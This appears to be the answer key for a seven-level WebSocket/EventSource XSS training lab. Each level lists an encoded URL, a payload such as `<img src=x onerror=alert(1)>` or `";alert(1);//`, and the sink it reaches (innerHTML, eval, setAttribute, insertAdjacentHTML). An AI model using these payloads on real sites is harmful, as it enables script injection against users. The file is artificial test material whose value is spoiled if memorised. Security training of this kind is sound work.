# websocket-xss — solutions

WebSocket-style message handlers that consume user input into innerHTML, JSON parse, eval, attribute setters, or stream-message bootstraps.

### websocket-xss-level1

`/websocket/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query inside single-quoted JS string → innerHTML — img onerror fires

### websocket-xss-level2

`/websocket/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query inside JSON message field — JSON.parse then innerHTML

### websocket-xss-level3

`/websocket/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query passed as message and innerHTML'd via createElement+innerHTML

### websocket-xss-level4

`/websocket/level4/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: query lands inside `eval('"..."'); — break quoted JS string

### websocket-xss-level5

`/websocket/level5/?query=alert(1)`

- payload: `alert(1)`
- context: JSON parse builds `{onclick: "..."}` then setAttribute — click runs JS

### websocket-xss-level6

`/websocket/level6/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed dispatched to WebSocket onmessage → innerHTML

### websocket-xss-level7

`/websocket/level7/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed dispatched to EventSource onmessage → insertAdjacentHTML
